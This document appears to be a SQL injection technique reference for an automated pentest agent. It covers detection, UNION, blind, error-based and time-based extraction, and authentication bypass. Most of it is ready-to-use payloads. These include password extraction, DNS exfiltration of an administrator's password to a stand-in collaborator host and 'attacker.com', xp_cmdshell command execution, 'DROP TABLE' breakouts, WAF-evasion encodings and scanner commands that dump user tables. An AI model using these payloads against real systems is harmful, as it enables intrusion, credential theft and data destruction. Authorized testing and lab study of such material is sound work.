---
id: PS-SQLI
category: SQL injection
wstg_refs: [WSTG-INPV-05]
lab_count: 18
---

# SQL Injection: Attack Technique Reference

## 1. Detection

### 1A. Initial Probes

Inject these probes into every user-controllable parameter (GET, POST, cookies, headers, JSON fields, XML values) and observe the response for errors, behavioral changes, or time delays.

**Error-based detection:**
```
'
''
`
``
,
"
""
```

**Boolean-based detection (compare response pairs):**
```
# String context
' AND '1'='1
' AND '1'='2

# Numeric context
 AND 1=1
 AND 1=2

# OR-based (returns all rows vs. normal)
' OR '1'='1
' OR '1'='2
```

**Comment-based truncation:**
```
' --
' #
' /*
'; --
'; #
```

**Arithmetic/logic probes (test SQL evaluation without quotes):**
```
# If original value is "5", try:
5-0
5-1
51-46
67-ASCII('C')

# If original value is a string "abc", try:
abc'||'
abc'+'
abc' '
```

**Time-based detection (universal blind detection):**
```
# Oracle
' || dbms_pipe.receive_message(('a'),10) --
# MSSQL
'; WAITFOR DELAY '0:0:10' --
# PostgreSQL
'; SELECT pg_sleep(10) --
# MySQL
' AND SLEEP(10) #
'; SELECT SLEEP(10) #
```

**What to look for:**
- HTTP 500 / database error messages in response body
- Different response length or content between true/false probes
- Measurable time delay (10+ seconds) for time-based probes
- Application behavioral change (more/fewer results, different redirect, missing content)

### 1B. Context Identification

Once injection is confirmed, identify the SQL context to choose the correct attack technique.

**String context** (most common -- value is inside single quotes):
```sql
SELECT * FROM products WHERE category = '[INPUT]'
-- Breakout: ' UNION SELECT ...--
```

**Numeric context** (value used as integer, no quotes):
```sql
SELECT * FROM products WHERE id = [INPUT]
-- Breakout: 1 UNION SELECT ...--
```

**ORDER BY / column name context** (input controls sort order):
```sql
SELECT * FROM products ORDER BY [INPUT]
-- Cannot use UNION directly. Use conditional:
-- (CASE WHEN (1=1) THEN column_a ELSE column_b END)
-- Or subquery-based blind extraction
```

**INSERT / UPDATE context** (input goes into data modification):
```sql
INSERT INTO logs (message) VALUES ('[INPUT]')
-- Breakout: '); DROP TABLE logs--
-- Or extract via error: ' || (SELECT password FROM users LIMIT 1) || '
```

**JSON context** (input embedded in JSON processed server-side):
```json
{"category": "[INPUT]"}
```
Break out with: `"} UNION SELECT ... --`

**XML context** (input in XML body processed by backend):
```xml
<storeId>[INPUT]</storeId>
```
Inject directly or use XML entity encoding to bypass WAFs (see Section 2H).

**Cookie / Header context:**
Same techniques as string/numeric context but injected via Cookie, Referer, X-Forwarded-For, or User-Agent headers.

---

## 2. Techniques

### 2A. UNION-Based Extraction

UNION attacks append a second SELECT to the original query, retrieving data from any accessible table. Two prerequisites must be satisfied: the injected UNION SELECT must return the same number of columns as the original, and corresponding column data types must be compatible.

> Lab refs: PS-SQLI-01, PS-SQLI-07, PS-SQLI-08, PS-SQLI-09, PS-SQLI-10

#### Step 1: Determine column count

**Method A -- ORDER BY incrementing (preferred):**
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
```
Increase until the application returns an error or different response. If `ORDER BY 3` succeeds but `ORDER BY 4` fails, there are 3 columns.

**Method B -- UNION SELECT NULL:**
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
NULL is compatible with every data type. When the correct number of NULLs is reached, the application returns successfully. On Oracle, add `FROM dual`:
```
' UNION SELECT NULL FROM dual--
```

**MySQL note:** The `--` comment requires a trailing space or use `#` instead:
```
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL#
```

#### Step 2: Find string-compatible columns

Test each column position with a string literal:
```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```
A column that accepts the string without error and reflects the value in the response can carry extracted data.

#### Step 3: Extract data

Once you know the column count and which columns accept strings:
```
' UNION SELECT username, password FROM users--
```

If only one column is string-compatible, concatenate multiple values:
```
# Oracle / PostgreSQL
' UNION SELECT username||'~'||password FROM users--

# MySQL
' UNION SELECT CONCAT(username,'~',password) FROM users--

# MSSQL
' UNION SELECT username+'~'+password FROM users--
```

#### Step 4: Enumerate the database

See Section 3 (Database-Specific Cheat Sheet) for the full enumeration queries per database engine.

**List tables (non-Oracle):**
```
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**List tables (Oracle):**
```
' UNION SELECT table_name,NULL FROM all_tables--
```

**List columns of a specific table (non-Oracle):**
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**List columns (Oracle):**
```
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

> Lab refs: PS-SQLI-03, PS-SQLI-04, PS-SQLI-05, PS-SQLI-06

---

### 2B. Blind: Boolean-Based

When the application does not return query results in the response but behaves differently for true vs. false conditions (e.g., shows a "Welcome back" message, returns different content length, or includes/excludes a page element).

> Lab refs: PS-SQLI-11

#### Detection

Inject boolean conditions and compare responses:
```
' AND '1'='1        -- true condition: normal behavior
' AND '1'='2        -- false condition: altered behavior
```

If the two responses differ consistently, boolean-based blind injection is possible.

#### Character-by-character extraction

Use SUBSTRING to extract one character at a time:
```
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='b'--
...
```

**Binary search optimization** (reduce requests from ~95 to ~7 per character):
```
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>64--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>96--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>112--
...
```
Bisect the ASCII range (32-126) to converge on each character in ~7 requests instead of brute-forcing all printable characters.

**Determine string length first:**
```
' AND LENGTH((SELECT password FROM users WHERE username='administrator'))>0--
' AND LENGTH((SELECT password FROM users WHERE username='administrator'))>10--
' AND LENGTH((SELECT password FROM users WHERE username='administrator'))>20--
' AND LENGTH((SELECT password FROM users WHERE username='administrator'))=20--
```

**Oracle SUBSTR syntax:**
```
' AND SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
```

---

### 2C. Blind: Error-Based

When boolean conditions do not change application behavior but database errors do (e.g., the application returns a generic error page for SQL errors vs. a normal page for successful queries).

> Lab refs: PS-SQLI-12, PS-SQLI-13

#### Conditional error technique

Construct a CASE expression that triggers a divide-by-zero (or other forced error) when a condition is true:

**Oracle:**
```
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)='a'--
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)='a'--
```

**MSSQL:**
```
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)=0--
```

**PostgreSQL:**
```
' AND 1=(SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--
```

**MySQL:**
```
' AND (SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a'))='a'--
```

Then substitute the condition with data extraction:
```
# Oracle example: extract password one character at a time
' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')='a'--
```

#### Visible error message extraction (CAST technique)

If the application displays verbose error messages, force a type conversion error that leaks data in the error text:

**PostgreSQL / MSSQL:**
```
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

The database will produce an error like: `ERROR: invalid input syntax for integer: "s3cr3tp4ssw0rd"` -- exposing the password in the error message.

**Oracle:**
```
' AND 1=TO_NUMBER((SELECT password FROM users WHERE ROWNUM=1))--
```

**Truncation bypass:** If the error message is length-limited, use SUBSTRING to extract specific ranges:
```
' AND 1=CAST((SELECT SUBSTRING(password,1,20) FROM users LIMIT 1) AS int)--
' AND 1=CAST((SELECT SUBSTRING(password,21,20) FROM users LIMIT 1) AS int)--
```

---

### 2D. Blind: Time-Based

When neither response content nor error behavior differs -- the application returns an identical response regardless of query outcome. Inject conditional time delays and measure response time.

> Lab refs: PS-SQLI-14, PS-SQLI-15

#### Unconditional delay (confirm injection exists)

**Oracle:**
```
' || dbms_pipe.receive_message(('a'),10)--
```

**MSSQL:**
```
'; WAITFOR DELAY '0:0:10'--
```

**PostgreSQL:**
```
'; SELECT pg_sleep(10)--
```

**MySQL:**
```
'; SELECT SLEEP(10)#
```

If the response takes ~10 seconds longer, time-based injection is confirmed.

#### Conditional delay (extract data)

**Oracle:**
```
' || (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM users WHERE username='administrator') || '--
```

**MSSQL:**
```
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' WAITFOR DELAY '0:0:10'--
```

**PostgreSQL:**
```
'; SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

**MySQL:**
```
'; SELECT IF(SUBSTRING(password,1,1)='a',SLEEP(10),'a') FROM users WHERE username='administrator'#
```

Use the binary search approach (ASCII comparison) from Section 2B to optimize extraction speed.

**Important:** Time-based blind is slow (one character per request cycle). Use only when boolean-based and error-based are not viable. Use a 5-10 second delay to reliably distinguish from normal network latency.

---

### 2E. Out-of-Band (OAST)

When in-band extraction is impossible (e.g., asynchronous query execution, no visible response differences, no time-observable behavior). The technique forces the database to make a DNS or HTTP request to an attacker-controlled server, optionally embedding extracted data in the request.

> Lab refs: PS-SQLI-16, PS-SQLI-17

#### DNS interaction only (confirm injection)

**Oracle (XXE via XMLType):**
```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR-DOMAIN/"> %remote;]>'),'/l') FROM dual--
```

**Oracle (UTL_INADDR):**
```
' UNION SELECT UTL_INADDR.get_host_address('COLLABORATOR-DOMAIN') FROM dual--
```

**MSSQL:**
```
'; exec master..xp_dirtree '//COLLABORATOR-DOMAIN/a'--
```

**PostgreSQL:**
```
'; copy (SELECT '') to program 'nslookup COLLABORATOR-DOMAIN'--
```

**MySQL (Windows only):**
```
' UNION SELECT LOAD_FILE('\\\\COLLABORATOR-DOMAIN\\a')#
```

#### DNS exfiltration with data

Embed query results as a subdomain in the DNS lookup:

**Oracle:**
```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR-DOMAIN/"> %remote;]>'),'/l') FROM dual--
```

**MSSQL:**
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@p+'.COLLABORATOR-DOMAIN/a"')--
```

**PostgreSQL:**
```
'; CREATE OR REPLACE FUNCTION f() RETURNS void AS $$
DECLARE r text;
BEGIN
  r := (SELECT password FROM users WHERE username='administrator');
  PERFORM dblink_connect('host='||r||'.COLLABORATOR-DOMAIN user=x');
END;
$$ LANGUAGE plpgsql;
SELECT f()--
```

**MySQL (Windows only):**
```
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='administrator'),'.COLLABORATOR-DOMAIN\\a'))#
```

**Requirements:**
- An external server that logs DNS queries (OOB callback probe, interactsh, dnslog.cn, or custom DNS server)
- DNS subdomain labels max 63 chars; split long data across multiple exfiltration requests
- Oracle XXE method is the most reliable; MSSQL xp_dirtree requires sysadmin or appropriate permissions

---

### 2F. Authentication Bypass

Inject into login forms to bypass password verification by commenting out or short-circuiting the WHERE clause.

> Lab refs: PS-SQLI-02

**Comment out the password check:**
```
administrator'--
admin'--
' OR 1=1--
```

The resulting query becomes:
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='...'
```
The password condition is commented out, so any password is accepted.

**Universal bypass (return first user):**
```
' OR 1=1--
' OR 'a'='a'--
```
Returns all rows; the application typically logs in as the first user in the result set.

**Bypassing specific user check:**
```
administrator' AND '1'='1'--
admin' OR '1'='1
```

**INSERT-based registration bypass:**
If the application uses INSERT for registration and the username is injectable:
```
admin',(SELECT password FROM users WHERE username='admin'))--
```

---

### 2G. Second-Order Injection

Input is stored safely in the database (properly escaped during INSERT) but used unsafely in a subsequent query. The injection does not trigger on the initial input but fires when the stored value is retrieved and concatenated into another query.

**Detection approach:**
1. Register a user with a payload username like `admin'--`
2. Log in as that user
3. Observe if application features that use the stored username (profile display, activity logs, admin panels) trigger SQL errors or behavioral changes

**Common second-order targets:**
- Usernames used in "Welcome back, {username}" queries
- Stored search terms used in analytics or reporting queries
- Profile fields used in admin dashboard aggregation queries
- Email addresses used in notification scheduling queries

**Testing strategy:**
- Store payloads in every writable field (registration, profile update, comments)
- Trigger all possible code paths that read back stored data (view profile, generate reports, trigger notifications)
- Monitor for delayed errors, behavioral changes, or data leakage

---

### 2H. Filter/WAF Bypass Techniques

When the application or a WAF blocks common SQL injection patterns, use encoding, alternative syntax, or structural tricks to evade detection.

> Lab refs: PS-SQLI-18

#### XML/JSON encoding bypass

Encode SQL keywords in XML hex entities to evade keyword-matching WAFs:
```xml
<storeId>
1 &#x55;NION &#x53;ELECT username,password FROM users
</storeId>
```
The XML parser decodes the entities before the value reaches the SQL query, so `&#x55;NION` becomes `UNION` and `&#x53;ELECT` becomes `SELECT`.

**Full XML entity encoding for UNION SELECT:**
```
&#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;
```

**JSON Unicode escape:**
```json
{"id": "1 \u0055NION \u0053ELECT username,password FROM users"}
```

#### Case variation
```
uNiOn SeLeCt
UnIoN sElEcT
```

#### Comment injection (break up keywords)
```
UN/**/ION SEL/**/ECT
UNI/**/ON SE/**/LECT
```

#### URL encoding
```
%55NION %53ELECT
%2527 (double-encoded single quote)
```

#### Double URL encoding
```
%2555NION %2553ELECT
```

#### No-space bypasses (when spaces are filtered)
```
'UNION(SELECT(username),(password)FROM(users))--
'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--
'+UNION+SELECT+username,password+FROM+users--
```

#### Alternative string representations
```
# Instead of 'admin':
CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)    -- Oracle
CHAR(97,100,109,105,110)                            -- MySQL
CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)    -- PostgreSQL
```

#### Alternative to single quotes (when ' is filtered)
```
# Use hex literals (MySQL):
SELECT * FROM users WHERE username=0x61646d696e

# Use CHAR():
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)

# Use double quotes for string delimiters (MySQL):
SELECT * FROM users WHERE username="admin"
```

#### Stacked queries for WAF evasion
```
'; EXEC xp_cmdshell('whoami')--
'; SELECT pg_sleep(10)--
```

#### Using less common syntax
```
# HAVING/GROUP BY error-based (MSSQL):
' HAVING 1=1--
' GROUP BY column_name HAVING 1=1--

# INTO OUTFILE / DUMPFILE (MySQL):
' UNION SELECT password FROM users INTO OUTFILE '/tmp/out.txt'--
```

---

## 3. Database-Specific Cheat Sheet

### 3A. Quick Reference Table

| Feature | Oracle | MySQL | PostgreSQL | MSSQL |
|---|---|---|---|---|
| **String concat** | `'a'\|\|'b'` | `'a' 'b'` or `CONCAT('a','b')` | `'a'\|\|'b'` | `'a'+'b'` |
| **Substring** | `SUBSTR('abc',2,1)` | `SUBSTRING('abc',2,1)` | `SUBSTRING('abc',2,1)` | `SUBSTRING('abc',2,1)` |
| **Comments** | `--` | `#` or `-- ` or `/* */` | `--` or `/* */` | `--` or `/* */` |
| **Version** | `SELECT banner FROM v$version` | `SELECT @@version` | `SELECT version()` | `SELECT @@version` |
| **Current DB** | `SELECT ora_database_name FROM dual` | `SELECT database()` | `SELECT current_database()` | `SELECT db_name()` |
| **Current user** | `SELECT user FROM dual` | `SELECT user()` | `SELECT current_user` | `SELECT user_name()` |
| **List tables** | `SELECT table_name FROM all_tables` | `SELECT table_name FROM information_schema.tables` | `SELECT table_name FROM information_schema.tables` | `SELECT table_name FROM information_schema.tables` |
| **List columns** | `SELECT column_name FROM all_tab_columns WHERE table_name='X'` | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` |
| **Conditional** | `CASE WHEN (cond) THEN 'a' ELSE 'b' END` | `IF(cond,'a','b')` | `CASE WHEN (cond) THEN 'a' ELSE 'b' END` | `CASE WHEN (cond) THEN 'a' ELSE 'b' END` |
| **Stacked queries** | Not supported | Not typical in injection | Supported (`;`) | Supported (`;`) |
| **Time delay** | `dbms_pipe.receive_message(('a'),N)` | `SLEEP(N)` | `pg_sleep(N)` | `WAITFOR DELAY '0:0:N'` |
| **Conditional delay** | `CASE WHEN (cond) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END` | `IF(cond,SLEEP(10),'a')` | `CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END` | `IF (cond) WAITFOR DELAY '0:0:10'` |
| **DNS lookup** | `UTL_INADDR.get_host_address('domain')` | `LOAD_FILE('\\\\domain\\a')` (Win) | `copy ... to program 'nslookup domain'` | `exec master..xp_dirtree '//domain/a'` |
| **Error exfil** | `TO_NUMBER((SELECT ...))` | N/A (use IF subquery) | `CAST((SELECT ...) AS int)` | `CAST((SELECT ...) AS int)` |
| **Dual table req** | Yes (`FROM dual`) | No | No | No |

### 3B. Oracle-Specific Notes

- Every SELECT must include a FROM clause. Use `FROM dual` for queries that do not reference a real table.
- Does not support stacked queries (`;`-separated statements).
- String concatenation uses `||` only; `+` is arithmetic.
- SUBSTR (not SUBSTRING) for substring extraction.
- XML functions (EXTRACTVALUE, XMLType) are the most reliable OOB vector.
- Comments: `--` only (no `#`).

**Enumeration queries:**
```sql
-- All accessible tables
SELECT table_name FROM all_tables

-- All columns in a table
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS'

-- Version
SELECT banner FROM v$version WHERE ROWNUM = 1

-- Current user
SELECT user FROM dual
```

### 3C. MySQL-Specific Notes

- Comments: `#` or `-- ` (double-dash must be followed by a space).
- String concatenation: space-separated strings auto-concatenate (`'a' 'b'` = `'ab'`), or use `CONCAT()`.
- SUBSTRING (not SUBSTR, though SUBSTR also works as alias).
- Stacked queries generally do NOT work in injection contexts (MySQLi API limitation), but work in some configurations.
- `LOAD_FILE()` and `INTO OUTFILE` require FILE privilege and only work on the server filesystem.
- OOB via `LOAD_FILE` only works on Windows.
- `@@version` returns version; `database()` returns current database.

**Enumeration queries:**
```sql
-- All tables in current database
SELECT table_name FROM information_schema.tables WHERE table_schema = database()

-- All columns in a table
SELECT column_name FROM information_schema.columns WHERE table_name = 'users' AND table_schema = database()

-- All databases
SELECT schema_name FROM information_schema.schemata
```

### 3D. PostgreSQL-Specific Notes

- String concatenation: `||` operator.
- Supports stacked queries (`;`).
- Rich function library: `pg_sleep()`, `dblink_connect()`, `copy ... to program`.
- `copy ... to program` requires superuser privileges.
- CAST-based visible error extraction is very reliable.
- `current_database()` for current database name.

**Enumeration queries:**
```sql
-- All tables in current schema
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'

-- All columns
SELECT column_name FROM information_schema.columns WHERE table_name = 'users'

-- Current user
SELECT current_user

-- All databases
SELECT datname FROM pg_database
```

### 3E. MSSQL-Specific Notes

- String concatenation: `+` operator.
- Supports stacked queries (`;`) -- very powerful for command execution.
- `xp_cmdshell` executes OS commands (requires sysadmin; may be disabled but can be re-enabled).
- `xp_dirtree` for OOB DNS -- does not require sysadmin.
- `WAITFOR DELAY` for time-based blind.
- `@@version` returns version; `db_name()` returns current database.
- IF/ELSE available outside of queries (not inside SELECT; use CASE WHEN in SELECT).

**Enumeration queries:**
```sql
-- All tables in current database
SELECT table_name FROM information_schema.tables WHERE table_catalog = db_name()

-- All columns
SELECT column_name FROM information_schema.columns WHERE table_name = 'users'

-- All databases
SELECT name FROM master..sysdatabases

-- Current user
SELECT user_name()

-- Re-enable xp_cmdshell (if sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

---

## 4. Payload Library

### 4A. By Injection Context

#### String context (WHERE column = '[INPUT]')

```
# Detection
'
' AND '1'='1
' AND '1'='2
' OR '1'='1

# UNION extraction
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--

# Blind boolean
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--

# Blind time
' AND (SELECT SLEEP(10))--
' || dbms_pipe.receive_message(('a'),10)--

# Auth bypass
' OR 1=1--
admin'--
```

#### Numeric context (WHERE id = [INPUT])

```
# Detection
1 AND 1=1
1 AND 1=2
1 OR 1=1

# UNION extraction
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
1 UNION SELECT username,password FROM users--

# Blind boolean
1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--

# Error-based
1 AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

# Stacked query
1; WAITFOR DELAY '0:0:10'--
```

#### ORDER BY context (ORDER BY [INPUT])

```
# Detection (cannot use UNION directly)
1
2
3
9999  (error = out of range)

# Blind boolean via CASE
(CASE WHEN (1=1) THEN 1 ELSE 1/0 END)
(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN 1 ELSE 1/0 END)

# Time-based via subquery
(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)
```

#### INSERT context (INSERT INTO table VALUES ('[INPUT]', ...))

```
# Error-based extraction
') || (SELECT password FROM users LIMIT 1) || ('
', (SELECT password FROM users LIMIT 1))--

# Time-based
'); SELECT SLEEP(10)#
'); WAITFOR DELAY '0:0:10'--

# Stacked query (MSSQL/PostgreSQL)
'); exec master..xp_dirtree '//attacker.com/a'--
```

#### UPDATE context (UPDATE table SET column = '[INPUT]' WHERE ...)

```
# Error-based extraction
' || (SELECT password FROM users LIMIT 1) || '
'+(SELECT password FROM users WHERE username='admin')+'

# Blind boolean
' WHERE 1=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
```

#### JSON context ({"key": "[INPUT]"})

```
# Break out of JSON string value processed as SQL
1 UNION SELECT username,password FROM users--

# XML entity encoding for WAF bypass
&#x31; &#x55;NION &#x53;ELECT username,password FROM users
```

#### XML context (embedded in SOAP, REST XML, etc.)

```xml
<!-- Direct injection in XML value -->
<id>1 UNION SELECT username,password FROM users--</id>

<!-- Hex entity encoding bypass -->
<id>1 &#x55;NION &#x53;ELECT username,password FROM users</id>

<!-- CDATA wrapping -->
<id><![CDATA[1 UNION SELECT username,password FROM users--]]></id>
```

### 4B. By Bypass Level

#### Basic (no filtering)
```
' OR 1=1--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
'; WAITFOR DELAY '0:0:10'--
```

#### Intermediate (keyword filtering, basic WAF)
```
# Case variation
' uNiOn SeLeCt username,password fRoM users--

# Comment insertion
' UNI/**/ON SEL/**/ECT username,password FR/**/OM users--

# URL encoding
' %55NION %53ELECT username,password FROM users--

# No-space bypass
'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--
'+UNION+SELECT+username,password+FROM+users--
'UNION(SELECT(username),(password)FROM(users))--

# String without quotes (MySQL hex)
UNION SELECT * FROM users WHERE username=0x61646d696e

# Alternative comment termination
' UNION SELECT username,password FROM users-- -
' UNION SELECT username,password FROM users#
```

#### Advanced (WAF evasion, deep inspection bypass)
```
# XML hex entity encoding (bypasses most keyword-matching WAFs)
1 &#x55;NION &#x53;ELECT username,password FROM users

# JSON Unicode escape
{"id": "1 \u0055NION \u0053ELECT username,password FROM users"}

# Double URL encoding
%2527 OR 1=1--
%2555NION %2553ELECT

# HPP (HTTP Parameter Pollution)
id=1 UNION/*&id=*/SELECT username,password FROM users

# String building via CHAR/CHR (avoid string literals entirely)
UNION SELECT username,password FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)

# Overlong UTF-8
%C0%A7 (alternative representation of single quote)

# Scientific notation for numeric bypass
1e0UNION SELECT username,password FROM users

# Line breaks (bypass single-line regex)
1 UNION%0aSELECT%0ausername,password%0aFROM%0ausers

# Buffer overflow WAF bypass (prefix with long garbage)
1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 ... UNION SELECT username,password FROM users--
```

---

## 5. Automated Tool Integration

### sql-injection-cli

The primary automated SQL injection tool. Use after manual detection confirms or suspects injection.

```bash
# Basic scan
sql-injection-cli -u "https://target.com/page?id=1" --batch --random-agent

# With authentication
sql-injection-cli -u "https://target.com/page?id=1" --cookie="session=abc123" --batch

# POST data
sql-injection-cli -u "https://target.com/login" --data="username=admin&password=test" --batch

# Specific parameter
sql-injection-cli -u "https://target.com/page?id=1&name=test" -p id --batch

# Through HTTP proxy (http_probe)
sql-injection-cli -u "https://target.com/page?id=1" --proxy="http://127.0.0.1:8080" --batch

# Force specific technique
sql-injection-cli -u "https://target.com/page?id=1" --technique=BT --batch
# B=boolean, E=error, U=UNION, S=stacked, T=time, Q=inline query

# Enumerate databases
sql-injection-cli -u "https://target.com/page?id=1" --dbs --batch

# Enumerate tables
sql-injection-cli -u "https://target.com/page?id=1" -D database_name --tables --batch

# Dump specific table
sql-injection-cli -u "https://target.com/page?id=1" -D database_name -T users --dump --batch

# Increase level and risk for deeper testing
sql-injection-cli -u "https://target.com/page?id=1" --level=5 --risk=3 --batch

# Test headers (Cookie, User-Agent, Referer)
sql-injection-cli -u "https://target.com/page" --headers="X-Forwarded-For: 1*" --batch

# JSON body
sql-injection-cli -u "https://target.com/api" --data='{"id": "1"}' --content-type="application/json" --batch

# WAF bypass with tamper scripts
sql-injection-cli -u "https://target.com/page?id=1" --tamper=space2comment,between,randomcase --batch
```

**Key sql-injection-cli tamper scripts for WAF bypass:**
- `space2comment` -- replaces spaces with `/**/`
- `between` -- replaces `>` with `NOT BETWEEN 0 AND`
- `randomcase` -- randomizes keyword case
- `charencode` -- URL-encodes payloads
- `equaltolike` -- replaces `=` with `LIKE`
- `greatest` -- replaces `>` with `GREATEST`
- `space2hash` -- replaces spaces with `#` and newline (MySQL)
- `space2mssqlblank` -- replaces spaces with random MSSQL whitespace chars
- `base64encode` -- base64-encodes the payload

### nosqli

For NoSQL injection detection (MongoDB, CouchDB, etc.):
```bash
nosqli scan -u "https://target.com/api/users?id=1"
nosqli scan -u "https://target.com/login" -d '{"username":"admin","password":"test"}' -t json
```

---

## 6. Detection-to-Exploitation Workflow

This is the recommended workflow for an automated pentest agent testing for SQL injection on a given endpoint.

```
1. IDENTIFY INPUT POINTS
   - URL parameters, POST body, cookies, headers, JSON/XML fields

2. INJECT CANARY
   - Send a unique string (e.g., SQLI_CANARY_12345) to establish baseline response

3. DETECT WITH PROBES
   a. Submit ' and observe for SQL error → Error-based likely
   b. Submit ' AND '1'='1 vs ' AND '1'='2 → Boolean-based likely
   c. Submit '; WAITFOR DELAY '0:0:10'-- → Time-based likely
   d. If all fail, try numeric context: AND 1=1 vs AND 1=2
   e. If all fail, try OOB: ' UNION SELECT UTL_INADDR... → OOB likely

4. IDENTIFY DATABASE TYPE
   a. Error messages often reveal DB type directly
   b. Try version queries: @@version (MySQL/MSSQL), version() (PG), banner FROM v$version (Oracle)
   c. Try DB-specific syntax: # comment (MySQL), DUAL table (Oracle), pg_sleep (PG)

5. CHOOSE TECHNIQUE (priority order)
   a. UNION-based (fastest extraction, if results visible)
   b. Error-based (fast extraction via CAST/CONVERT errors)
   c. Boolean-based (medium speed, character-by-character)
   d. Time-based (slow, last in-band resort)
   e. Out-of-band (when no in-band feedback possible)

6. EXTRACT DATA
   a. Enumerate: database name → tables → columns → data
   b. Priority targets: users table, credentials, API keys, PII
   c. Document every step with full request/response

7. DOCUMENT FINDING
   - Reproducible curl command
   - Full HTTP request showing injection point
   - HTTP response showing extracted data or behavioral proof
   - Classify: EXPLOITED (data extracted) or POTENTIAL (error/delay confirmed but no data)
```

---

## 7. Common Pitfalls for Automated Testing

1. **MySQL requires space after `--`**: Use `-- -` or `#` instead of bare `--`.
2. **Oracle requires FROM dual**: Every SELECT in a UNION must include `FROM dual`.
3. **Stacked queries fail silently**: MySQL and Oracle often ignore stacked queries; do not assume `;` works.
4. **WAF false negatives**: A blocked request is not proof of no vulnerability -- try bypass techniques before concluding "not vulnerable."
5. **Time-based false positives**: Network latency can mimic delay. Always test with both true and false conditions and compare times. Use delays of 10+ seconds.
6. **Content-type matters**: JSON endpoints may need `Content-Type: application/json`; XML endpoints need `Content-Type: application/xml`. Sending form-encoded data to a JSON endpoint will not trigger injection.
7. **Cookie injection**: Some applications use cookie values in SQL queries (e.g., tracking cookies, session lookups). Test cookies as injection points.
8. **Numeric context has no quotes**: Do not prepend `'` when the parameter is numeric. Use `1 AND 1=1` not `1' AND '1'='1`.
9. **Second-order may never surface**: Stored injection fires only when the value is re-used. Automated tools rarely detect this -- requires manual analysis of code paths or behavioral monitoring.
10. **Error messages may be cached**: If the same error page is returned regardless of input, the application may be caching error responses. Try unique inputs each time.
## Rynix workflow

1. `get_technique_guide` for `sql-injection` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `sql-injection-cli plugin`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `sql-injection-cli plugin`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
